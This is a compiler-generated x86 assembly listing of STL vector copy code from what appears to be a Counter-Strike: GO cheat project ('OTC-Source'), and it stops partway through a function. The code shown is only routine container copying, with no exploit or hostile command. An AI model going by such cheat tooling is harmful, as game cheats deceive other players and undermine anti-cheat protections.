; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\vector
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xutility
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\vector
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xutility
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xmemory
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xutility
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\vector
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\headers\segment\Segment.h
;	COMDAT ?GetFramework@Segment@@QAE?AVSegmentFramework@@XZ
_TEXT	SEGMENT
___$ReturnUdt$GSCopy$ = -28				; size = 4
_this$GSCopy$1$ = -24					; size = 4
__Rightlast$1$ = -20					; size = 4
__Count$1$ = -20					; size = 4
__Rightfirst$1$ = -20					; size = 4
__Rightfirst$1$ = -16					; size = 4
__Rightfirst$1$ = -16					; size = 4
__Count$1$ = -16					; size = 4
__$EHRec$ = -12						; size = 12
___$ReturnUdt$ = 8					; size = 4
?GetFramework@Segment@@QAE?AVSegmentFramework@@XZ PROC	; Segment::GetFramework, COMDAT
; _this$ = ecx

; 43   : 	SegmentFramework GetFramework () {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	6a ff		 push	 -1
  00005	68 00 00 00 00	 push	 __ehhandler$?GetFramework@Segment@@QAE?AVSegmentFramework@@XZ
  0000a	64 a1 00 00 00
	00		 mov	 eax, DWORD PTR fs:0
  00010	50		 push	 eax
  00011	83 ec 10	 sub	 esp, 16			; 00000010H
  00014	53		 push	 ebx
  00015	56		 push	 esi
  00016	57		 push	 edi
  00017	a1 00 00 00 00	 mov	 eax, DWORD PTR ___security_cookie
  0001c	33 c5		 xor	 eax, ebp
  0001e	50		 push	 eax
  0001f	8d 45 f4	 lea	 eax, DWORD PTR __$EHRec$[ebp]
  00022	64 a3 00 00 00
	00		 mov	 DWORD PTR fs:0, eax
  00028	8b c1		 mov	 eax, ecx
  0002a	89 45 e8	 mov	 DWORD PTR _this$GSCopy$1$[ebp], eax
  0002d	8b 5d 08	 mov	 ebx, DWORD PTR ___$ReturnUdt$[ebp]
  00030	89 5d e4	 mov	 DWORD PTR ___$ReturnUdt$GSCopy$[ebp], ebx
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\vector

; 374  :     _Vector_val() noexcept : _Myfirst(), _Mylast(), _Myend() {}

  00033	c7 03 00 00 00
	00		 mov	 DWORD PTR [ebx], 0
  00039	c7 43 04 00 00
	00 00		 mov	 DWORD PTR [ebx+4], 0
  00040	c7 43 08 00 00
	00 00		 mov	 DWORD PTR [ebx+8], 0

; 524  :         const pointer _Rightfirst = _Right_data._Myfirst;

  00047	8b 50 14	 mov	 edx, DWORD PTR [eax+20]

; 525  :         const pointer _Rightlast  = _Right_data._Mylast;

  0004a	8b 48 18	 mov	 ecx, DWORD PTR [eax+24]
  0004d	89 55 ec	 mov	 DWORD PTR __Rightfirst$1$[ebp], edx

; 526  :         _Container_proxy_ptr<_Alty> _Proxy(_Alproxy, _My_data);
; 527  :         if (_Rightfirst != _Rightlast) {

  00050	3b d1		 cmp	 edx, ecx
  00052	74 2c		 je	 SHORT $LN28@GetFramewo

; 528  :             _Buy_raw(static_cast<size_type>(_Rightlast - _Rightfirst));

  00054	2b ca		 sub	 ecx, edx
  00056	8b f9		 mov	 edi, ecx
  00058	89 4d f0	 mov	 DWORD PTR __Count$1$[ebp], ecx
  0005b	c1 ff 03	 sar	 edi, 3
  0005e	8b cb		 mov	 ecx, ebx
  00060	57		 push	 edi
  00061	e8 00 00 00 00	 call	 ?_Buy_raw@?$vector@URelocatedNetVar@SegmentFramework@@V?$allocator@URelocatedNetVar@SegmentFramework@@@std@@@std@@AAEXI@Z ; std::vector<SegmentFramework::RelocatedNetVar,std::allocator<SegmentFramework::RelocatedNetVar> >::_Buy_raw
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xutility

; 3754 :     _CSTD memmove(_Dest_ch, _First_ch, _Count);

  00066	ff 75 f0	 push	 DWORD PTR __Count$1$[ebp]
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\vector

; 1588 :         return _Uninitialized_copy(_First, _Last, _Dest, _Getal());

  00069	8b 33		 mov	 esi, DWORD PTR [ebx]
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xutility

; 3754 :     _CSTD memmove(_Dest_ch, _First_ch, _Count);

  0006b	ff 75 ec	 push	 DWORD PTR __Rightfirst$1$[ebp]
  0006e	56		 push	 esi
  0006f	e8 00 00 00 00	 call	 _memmove
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xmemory

; 1528 :         _Dest += _ULast - _UFirst;

  00074	8d 04 fe	 lea	 eax, DWORD PTR [esi+edi*8]
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xutility

; 3754 :     _CSTD memmove(_Dest_ch, _First_ch, _Count);

  00077	83 c4 0c	 add	 esp, 12			; 0000000cH
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\vector

; 530  :             _My_data._Mylast = _Ucopy(_Rightfirst, _Rightlast, _My_data._Myfirst);

  0007a	89 43 04	 mov	 DWORD PTR [ebx+4], eax
  0007d	8b 45 e8	 mov	 eax, DWORD PTR _this$GSCopy$1$[ebp]
$LN28@GetFramewo:
  00080	c7 45 fc 00 00
	00 00		 mov	 DWORD PTR __$EHRec$[ebp+8], 0

; 374  :     _Vector_val() noexcept : _Myfirst(), _Mylast(), _Myend() {}

  00087	c7 43 0c 00 00
	00 00		 mov	 DWORD PTR [ebx+12], 0
  0008e	c7 43 10 00 00
	00 00		 mov	 DWORD PTR [ebx+16], 0
  00095	c7 43 14 00 00
	00 00		 mov	 DWORD PTR [ebx+20], 0

; 524  :         const pointer _Rightfirst = _Right_data._Myfirst;

  0009c	8b 50 20	 mov	 edx, DWORD PTR [eax+32]

; 525  :         const pointer _Rightlast  = _Right_data._Mylast;

  0009f	8b 48 24	 mov	 ecx, DWORD PTR [eax+36]
  000a2	89 55 f0	 mov	 DWORD PTR __Rightfirst$1$[ebp], edx

; 526  :         _Container_proxy_ptr<_Alty> _Proxy(_Alproxy, _My_data);
; 527  :         if (_Rightfirst != _Rightlast) {

  000a5	3b d1		 cmp	 edx, ecx
  000a7	74 2e		 je	 SHORT $LN69@GetFramewo

; 528  :             _Buy_raw(static_cast<size_type>(_Rightlast - _Rightfirst));

  000a9	2b ca		 sub	 ecx, edx
  000ab	8b f9		 mov	 edi, ecx
  000ad	89 4d ec	 mov	 DWORD PTR __Count$1$[ebp], ecx
  000b0	c1 ff 02	 sar	 edi, 2
  000b3	8d 4b 0c	 lea	 ecx, DWORD PTR [ebx+12]
  000b6	57		 push	 edi
  000b7	e8 00 00 00 00	 call	 ?_Buy_raw@?$vector@PBDV?$allocator@PBD@std@@@std@@AAEXI@Z ; std::vector<char const *,std::allocator<char const *> >::_Buy_raw
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xutility

; 3754 :     _CSTD memmove(_Dest_ch, _First_ch, _Count);

  000bc	ff 75 ec	 push	 DWORD PTR __Count$1$[ebp]
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\vector

; 1588 :         return _Uninitialized_copy(_First, _Last, _Dest, _Getal());

  000bf	8b 73 0c	 mov	 esi, DWORD PTR [ebx+12]
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xutility

; 3754 :     _CSTD memmove(_Dest_ch, _First_ch, _Count);

  000c2	ff 75 f0	 push	 DWORD PTR __Rightfirst$1$[ebp]
  000c5	56		 push	 esi
  000c6	e8 00 00 00 00	 call	 _memmove
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xmemory

; 1528 :         _Dest += _ULast - _UFirst;

  000cb	8d 04 be	 lea	 eax, DWORD PTR [esi+edi*4]
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xutility

; 3754 :     _CSTD memmove(_Dest_ch, _First_ch, _Count);

  000ce	83 c4 0c	 add	 esp, 12			; 0000000cH
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\vector

; 530  :             _My_data._Mylast = _Ucopy(_Rightfirst, _Rightlast, _My_data._Myfirst);

  000d1	89 43 10	 mov	 DWORD PTR [ebx+16], eax
  000d4	8b 45 e8	 mov	 eax, DWORD PTR _this$GSCopy$1$[ebp]
$LN69@GetFramewo:
  000d7	c6 45 fc 01	 mov	 BYTE PTR __$EHRec$[ebp+8], 1

; 374  :     _Vector_val() noexcept : _Myfirst(), _Mylast(), _Myend() {}

  000db	c7 43 18 00 00
	00 00		 mov	 DWORD PTR [ebx+24], 0
  000e2	c7 43 1c 00 00
	00 00		 mov	 DWORD PTR [ebx+28], 0
  000e9	c7 43 20 00 00
	00 00		 mov	 DWORD PTR [ebx+32], 0

; 524  :         const pointer _Rightfirst = _Right_data._Myfirst;

  000f0	8b 48 2c	 mov	 ecx, DWORD PTR [eax+44]

; 525  :         const pointer _Rightlast  = _Right_data._Mylast;

  000f3	8b 40 30	 mov	 eax, DWORD PTR [eax+48]
  000f6	89 4d f0	 mov	 DWORD PTR __Rightfirst$1$[ebp], ecx

; 526  :         _Container_proxy_ptr<_Alty> _Proxy(_Alproxy, _My_data);
; 527  :         if (_Rightfirst != _Rightlast) {

  000f9	3b c8		 cmp	 ecx, eax
  000fb	74 2b		 je	 SHORT $LN132@GetFramewo

; 528  :             _Buy_raw(static_cast<size_type>(_Rightlast - _Rightfirst));

  000fd	2b c1		 sub	 eax, ecx
  000ff	8d 4b 18	 lea	 ecx, DWORD PTR [ebx+24]
  00102	8b f8		 mov	 edi, eax
  00104	89 45 ec	 mov	 DWORD PTR __Rightlast$1$[ebp], eax
  00107	c1 ff 02	 sar	 edi, 2
  0010a	57		 push	 edi
  0010b	e8 00 00 00 00	 call	 ?_Buy_raw@?$vector@PBDV?$allocator@PBD@std@@@std@@AAEXI@Z ; std::vector<char const *,std::allocator<char const *> >::_Buy_raw
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xutility

; 3754 :     _CSTD memmove(_Dest_ch, _First_ch, _Count);

  00110	ff 75 ec	 push	 DWORD PTR __Rightlast$1$[ebp]
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\vector

; 1588 :         return _Uninitialized_copy(_First, _Last, _Dest, _Getal());

  00113	8b 73 18	 mov	 esi, DWORD PTR [ebx+24]
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xutility

; 3754 :     _CSTD memmove(_Dest_ch, _First_ch, _Count);

  00116	ff 75 f0	 push	 DWORD PTR __Rightfirst$1$[ebp]
  00119	56		 push	 esi
  0011a	e8 00 00 00 00	 call	 _memmove
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xmemory

; 1528 :         _Dest += _ULast - _UFirst;

  0011f	8d 0c be	 lea	 ecx, DWORD PTR [esi+edi*4]
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xutility

; 3754 :     _CSTD memmove(_Dest_ch, _First_ch, _Count);

  00122	83 c4 0c	 add	 esp, 12			; 0000000cH
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\vector

; 530  :             _My_data._Mylast = _Ucopy(_Rightfirst, _Rightlast, _My_data._Myfirst);

  00125	89 4b 1c	 mov	 DWORD PTR [ebx+28], ecx
$LN132@GetFramewo:
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\headers\segment\Segment.h

; 45   :     }

  00128	8b c3		 mov	 eax, ebx
  0012a	8b 4d f4	 mov	 ecx, DWORD PTR __$EHRec$[ebp]
  0012d	64 89 0d 00 00
	00 00		 mov	 DWORD PTR fs:0, ecx
  00134	59		 pop	 ecx
  00135	5f		 pop	 edi
  00136	5e		 pop	 esi
  00137	5b		 pop	 ebx
  00138	8b e5		 mov	 esp, ebp
  0013a	5d		 pop	 ebp
  0013b	c2 04 00	 ret	 4
_TEXT	ENDS
;	COMDAT text$x
text$x	SEGMENT
__unwindfunclet$?GetFramework@Segment@@QAE?AVSegmentFramework@@XZ$1:
  00000	8b 4d e4	 mov	 ecx, DWORD PTR ___$ReturnUdt$GSCopy$[ebp]
  00003	e9 00 00 00 00	 jmp	 ??1?$vector@URelocatedNetVar@SegmentFramework@@V?$allocator@URelocatedNetVar@SegmentFramework@@@std@@@std@@QAE@XZ ; std::vector<SegmentFramework::RelocatedNetVar,std::allocator<SegmentFramework::RelocatedNetVar> >::~vector<SegmentFramework::RelocatedNetVar,std::allocator<SegmentFramework::RelocatedNetVar> >
__unwindfunclet$?GetFramework@Segment@@QAE?AVSegmentFramework@@XZ$2:
  00008	8b 4d e4	 mov	 ecx, DWORD PTR ___$ReturnUdt$GSCopy$[ebp]
  0000b	83 c1 0c	 add	 ecx, 12			; 0000000cH
  0000e	e9 00 00 00 00	 jmp	 ??1?$vector@PBDV?$allocator@PBD@std@@@std@@QAE@XZ ; std::vector<char const *,std::allocator<char const *> >::~vector<char const *,std::allocator<char const *> >
  00013	cc		 int	 3
  00014	cc		 int	 3
  00015	cc		 int	 3
  00016	cc		 int	 3
  00017	cc		 int	 3
__ehhandler$?GetFramework@Segment@@QAE?AVSegmentFramework@@XZ:
  00018	90		 npad	 1
  00019	90		 npad	 1
  0001a	8b 54 24 08	 mov	 edx, DWORD PTR [esp+8]
  0001e	8d 42 0c	 lea	 eax, DWORD PTR [edx+12]
  00021	8b 4a e0	 mov	 ecx, DWORD PTR [edx-32]
  00024	33 c8		 xor	 ecx, eax
  00026	e8 00 00 00 00	 call	 @__security_check_cookie@4
  0002b	b8 00 00 00 00	 mov	 eax, OFFSET __ehfuncinfo$?GetFramework@Segment@@QAE?AVSegmentFramework@@XZ
  00030	e9 00 00 00 00	 jmp	 ___CxxFrameHandler3
text$x	ENDS
?GetFramework@Segment@@QAE?AVSegmentFramework@@XZ ENDP	; Segment::GetFramework
; Function compile flags: /Ogtp
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\vector
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xutility
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\vector
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xutility
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xmemory
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xutility
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\vector
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xutility
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\vector
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xutility
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xmemory
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xutility
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\vector
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xutility
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\vector
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xutility
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xmemory
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xutility
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\vector
;	COMDAT ??0SegmentFramework@@QAE@ABV0@@Z
_TEXT	SEGMENT
_this$GSCopy$ = -28					; size = 4
___that$GSCopy$1$ = -24					; size = 4
__Rightfirst$1$ = -20					; size = 4
__Rightfirst$1$ = -20					; size = 4
__Count$1$ = -20					; size = 4
__Rightlast$1$ = -16					; size = 4
__Count$1$ = -16					; size = 4
__Rightfirst$1$ = -16					; size = 4
_this$ = -16						; size = 4
__$EHRec$ = -12						; size = 12
___that$ = 8						; size = 4
??0SegmentFramework@@QAE@ABV0@@Z PROC			; SegmentFramework::SegmentFramework, COMDAT
; _this$ = ecx
  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	6a ff		 push	 -1
  00005	68 00 00 00 00	 push	 __ehhandler$??0SegmentFramework@@QAE@ABV0@@Z
  0000a	64 a1 00 00 00
	00		 mov	 eax, DWORD PTR fs:0
  00010	50		 push	 eax
  00011	83 ec 10	 sub	 esp, 16			; 00000010H
  00014	53		 push	 ebx
  00015	56		 push	 esi
  00016	57		 push	 edi
  00017	a1 00 00 00 00	 mov	 eax, DWORD PTR ___security_cookie
  0001c	33 c5		 xor	 eax, ebp
  0001e	50		 push	 eax
  0001f	8d 45 f4	 lea	 eax, DWORD PTR __$EHRec$[ebp]
  00022	64 a3 00 00 00
	00		 mov	 DWORD PTR fs:0, eax
  00028	8b d9		 mov	 ebx, ecx
  0002a	89 5d f0	 mov	 DWORD PTR _this$[ebp], ebx

; 520  :         : _Mypair(_One_then_variadic_args_t(), _Alty_traits::select_on_container_copy_construction(_Right._Getal())) {

  0002d	8b 45 08	 mov	 eax, DWORD PTR ___that$[ebp]
  00030	89 5d e4	 mov	 DWORD PTR _this$GSCopy$[ebp], ebx

; 374  :     _Vector_val() noexcept : _Myfirst(), _Mylast(), _Myend() {}

  00033	c7 03 00 00 00
	00		 mov	 DWORD PTR [ebx], 0
  00039	c7 43 04 00 00
	00 00		 mov	 DWORD PTR [ebx+4], 0
  00040	c7 43 08 00 00
	00 00		 mov	 DWORD PTR [ebx+8], 0

; 524  :         const pointer _Rightfirst = _Right_data._Myfirst;

  00047	8b 10		 mov	 edx, DWORD PTR [eax]

; 525  :         const pointer _Rightlast  = _Right_data._Mylast;

  00049	8b 48 04	 mov	 ecx, DWORD PTR [eax+4]
  0004c	89 45 e8	 mov	 DWORD PTR ___that$GSCopy$1$[ebp], eax
  0004f	89 55 f0	 mov	 DWORD PTR __Rightfirst$1$[ebp], edx

; 526  :         _Container_proxy_ptr<_Alty> _Proxy(_Alproxy, _My_data);
; 527  :         if (_Rightfirst != _Rightlast) {

  00052	3b d1		 cmp	 edx, ecx
  00054	74 2c		 je	 SHORT $LN24@SegmentFra

; 528  :             _Buy_raw(static_cast<size_type>(_Rightlast - _Rightfirst));

  00056	2b ca		 sub	 ecx, edx
  00058	8b f9		 mov	 edi, ecx
  0005a	89 4d ec	 mov	 DWORD PTR __Count$1$[ebp], ecx
  0005d	c1 ff 03	 sar	 edi, 3
  00060	8b cb		 mov	 ecx, ebx
  00062	57		 push	 edi
  00063	e8 00 00 00 00	 call	 ?_Buy_raw@?$vector@URelocatedNetVar@SegmentFramework@@V?$allocator@URelocatedNetVar@SegmentFramework@@@std@@@std@@AAEXI@Z ; std::vector<SegmentFramework::RelocatedNetVar,std::allocator<SegmentFramework::RelocatedNetVar> >::_Buy_raw
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xutility

; 3754 :     _CSTD memmove(_Dest_ch, _First_ch, _Count);

  00068	ff 75 ec	 push	 DWORD PTR __Count$1$[ebp]
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\vector

; 1588 :         return _Uninitialized_copy(_First, _Last, _Dest, _Getal());

  0006b	8b 33		 mov	 esi, DWORD PTR [ebx]
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xutility

; 3754 :     _CSTD memmove(_Dest_ch, _First_ch, _Count);

  0006d	ff 75 f0	 push	 DWORD PTR __Rightfirst$1$[ebp]
  00070	56		 push	 esi
  00071	e8 00 00 00 00	 call	 _memmove
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xmemory

; 1528 :         _Dest += _ULast - _UFirst;

  00076	8d 04 fe	 lea	 eax, DWORD PTR [esi+edi*8]
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xutility

; 3754 :     _CSTD memmove(_Dest_ch, _First_ch, _Count);

  00079	83 c4 0c	 add	 esp, 12			; 0000000cH
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\vector

; 530  :             _My_data._Mylast = _Ucopy(_Rightfirst, _Rightlast, _My_data._Myfirst);

  0007c	89 43 04	 mov	 DWORD PTR [ebx+4], eax
  0007f	8b 45 e8	 mov	 eax, DWORD PTR ___that$GSCopy$1$[ebp]
$LN24@SegmentFra:
  00082	c7 45 fc 00 00
	00 00		 mov	 DWORD PTR __$EHRec$[ebp+8], 0

; 374  :     _Vector_val() noexcept : _Myfirst(), _Mylast(), _Myend() {}

  00089	c7 43 0c 00 00
	00 00		 mov	 DWORD PTR [ebx+12], 0
  00090	c7 43 10 00 00
	00 00		 mov	 DWORD PTR [ebx+16], 0
  00097	c7 43 14 00 00
	00 00		 mov	 DWORD PTR [ebx+20], 0

; 524  :         const pointer _Rightfirst = _Right_data._Myfirst;

  0009e	8b 50 0c	 mov	 edx, DWORD PTR [eax+12]

; 525  :         const pointer _Rightlast  = _Right_data._Mylast;

  000a1	8b 48 10	 mov	 ecx, DWORD PTR [eax+16]
  000a4	89 55 ec	 mov	 DWORD PTR __Rightfirst$1$[ebp], edx

; 526  :         _Container_proxy_ptr<_Alty> _Proxy(_Alproxy, _My_data);
; 527  :         if (_Rightfirst != _Rightlast) {

  000a7	3b d1		 cmp	 edx, ecx
  000a9	74 2e		 je	 SHORT $LN65@SegmentFra

; 528  :             _Buy_raw(static_cast<size_type>(_Rightlast - _Rightfirst));

  000ab	2b ca		 sub	 ecx, edx
  000ad	8b f9		 mov	 edi, ecx
  000af	89 4d f0	 mov	 DWORD PTR __Count$1$[ebp], ecx
  000b2	c1 ff 02	 sar	 edi, 2
  000b5	8d 4b 0c	 lea	 ecx, DWORD PTR [ebx+12]
  000b8	57		 push	 edi
  000b9	e8 00 00 00 00	 call	 ?_Buy_raw@?$vector@PBDV?$allocator@PBD@std@@@std@@AAEXI@Z ; std::vector<char const *,std::allocator<char const *> >::_Buy_raw
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xutility

; 3754 :     _CSTD memmove(_Dest_ch, _First_ch, _Count);

  000be	ff 75 f0	 push	 DWORD PTR __Count$1$[ebp]
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\vector

; 1588 :         return _Uninitialized_copy(_First, _Last, _Dest, _Getal());

  000c1	8b 73 0c	 mov	 esi, DWORD PTR [ebx+12]
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xutility

; 3754 :     _CSTD memmove(_Dest_ch, _First_ch, _Count);

  000c4	ff 75 ec	 push	 DWORD PTR __Rightfirst$1$[ebp]
  000c7	56		 push	 esi
  000c8	e8 00 00 00 00	 call	 _memmove
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xmemory

; 1528 :         _Dest += _ULast - _UFirst;

  000cd	8d 04 be	 lea	 eax, DWORD PTR [esi+edi*4]
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xutility

; 3754 :     _CSTD memmove(_Dest_ch, _First_ch, _Count);

  000d0	83 c4 0c	 add	 esp, 12			; 0000000cH
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\vector

; 530  :             _My_data._Mylast = _Ucopy(_Rightfirst, _Rightlast, _My_data._Myfirst);

  000d3	89 43 10	 mov	 DWORD PTR [ebx+16], eax
  000d6	8b 45 e8	 mov	 eax, DWORD PTR ___that$GSCopy$1$[ebp]
$LN65@SegmentFra:
  000d9	c6 45 fc 01	 mov	 BYTE PTR __$EHRec$[ebp+8], 1

; 374  :     _Vector_val() noexcept : _Myfirst(), _Mylast(), _Myend() {}

  000dd	c7 43 18 00 00
	00 00		 mov	 DWORD PTR [ebx+24], 0
  000e4	c7 43 1c 00 00
	00 00		 mov	 DWORD PTR [ebx+28], 0
  000eb	c7 43 20 00 00
	00 00		 mov	 DWORD PTR [ebx+32], 0

; 524  :         const pointer _Rightfirst = _Right_data._Myfirst;

  000f2	8b 48 18	 mov	 ecx, DWORD PTR [eax+24]

; 525  :         const pointer _Rightlast  = _Right_data._Mylast;

  000f5	8b 40 1c	 mov	 eax, DWORD PTR [eax+28]
  000f8	89 4d ec	 mov	 DWORD PTR __Rightfirst$1$[ebp], ecx

; 526  :         _Container_proxy_ptr<_Alty> _Proxy(_Alproxy, _My_data);
; 527  :         if (_Rightfirst != _Rightlast) {

  000fb	3b c8		 cmp	 ecx, eax
  000fd	74 2b		 je	 SHORT $LN127@SegmentFra

; 528  :             _Buy_raw(static_cast<size_type>(_Rightlast - _Rightfirst));

  000ff	2b c1		 sub	 eax, ecx
  00101	8d 4b 18	 lea	 ecx, DWORD PTR [ebx+24]
  00104	8b f8		 mov	 edi, eax
  00106	89 45 f0	 mov	 DWORD PTR __Rightlast$1$[ebp], eax
  00109	c1 ff 02	 sar	 edi, 2
  0010c	57		 push	 edi
  0010d	e8 00 00 00 00	 call	 ?_Buy_raw@?$vector@PBDV?$allocator@PBD@std@@@std@@AAEXI@Z ; std::vector<char const *,std::allocator<char const *> >::_Buy_raw
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xutility

; 3754 :     _CSTD memmove(_Dest_ch, _First_ch, _Count);

  00112	ff 75 f0	 push	 DWORD PTR __Rightlast$1$[ebp]
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\vector

; 1588 :         return _Uninitialized_copy(_First, _Last, _Dest, _Getal());

  00115	8b 73 18	 mov	 esi, DWORD PTR [ebx+24]
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xutility

; 3754 :     _CSTD memmove(_Dest_ch, _First_ch, _Count);

  00118	ff 75 ec	 push	 DWORD PTR __Rightfirst$1$[ebp]
  0011b	56		 push	 esi
  0011c	e8 00 00 00 00	 call	 _memmove
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xmemory

; 1528 :         _Dest += _ULast - _UFirst;

  00121	8d 0c be	 lea	 ecx, DWORD PTR [esi+edi*4]
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xutility

; 3754 :     _CSTD memmove(_Dest_ch, _First_ch, _Count);

  00124	83 c4 0c	 add	 esp, 12			; 0000000cH
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\vector

; 530  :             _My_data._Mylast = _Ucopy(_Rightfirst, _Rightlast, _My_data._Myfirst);

  00127	89 4b 1c	 mov	 DWORD PTR [ebx+28], ecx
$LN127@SegmentFra:
  0012a	8b c3		 mov	 eax, ebx
  0012c	8b 4d f4	 mov	 ecx, DWORD PTR __$EHRec$[ebp]
  0012f	64 89 0d 00 00
	00 00		 mov	 DWORD PTR fs:0, ecx
  00136	59		 pop	 ecx
  00137	5f		 pop	 edi
  00138	5e		 pop	 esi
  00139	5b		 pop	 ebx
  0013a	8b e5		 mov	 esp, ebp
  0013c	5d		 pop	 ebp
  0013d	c2 04 00	 ret	 4
_TEXT	ENDS
;	COMDAT text$x
text$x	SEGMENT
__unwindfunclet$??0SegmentFramework@@QAE@ABV0@@Z$0:
  00000	8b 4d e4	 mov	 ecx, DWORD PTR _this$GSCopy$[ebp]
  00003	e9 00 00 00 00	 jmp	 ??1?$vector@URelocatedNetVar@SegmentFramework@@V?$allocator@URelocatedNetVar@SegmentFramework@@@std@@@std@@QAE@XZ ; std::vector<SegmentFramework::RelocatedNetVar,std::allocator<SegmentFramework::RelocatedNetVar> >::~vector<SegmentFramework::RelocatedNetVar,std::allocator<SegmentFramework::RelocatedNetVar> >
__unwindfunclet$??0SegmentFramework@@QAE@ABV0@@Z$1:
  00008	8b 4d e4	 mov	 ecx, DWORD PTR _this$GSCopy$[ebp]
  0000b	83 c1 0c	 add	 ecx, 12			; 0000000cH
  0000e	e9 00 00 00 00	 jmp	 ??1?$vector@PBDV?$allocator@PBD@std@@@std@@QAE@XZ ; std::vector<char const *,std::allocator<char const *> >::~vector<char const *,std::allocator<char const *> >
  00013	cc		 int	 3
  00014	cc		 int	 3
  00015	cc		 int	 3
  00016	cc		 int	 3
  00017	cc		 int	 3
__ehhandler$??0SegmentFramework@@QAE@ABV0@@Z:
  00018	90		 npad	 1
  00019	90		 npad	 1
  0001a	8b 54 24 08	 mov	 edx, DWORD PTR [esp+8]
  0001e	8d 42 0c	 lea	 eax, DWORD PTR [edx+12]
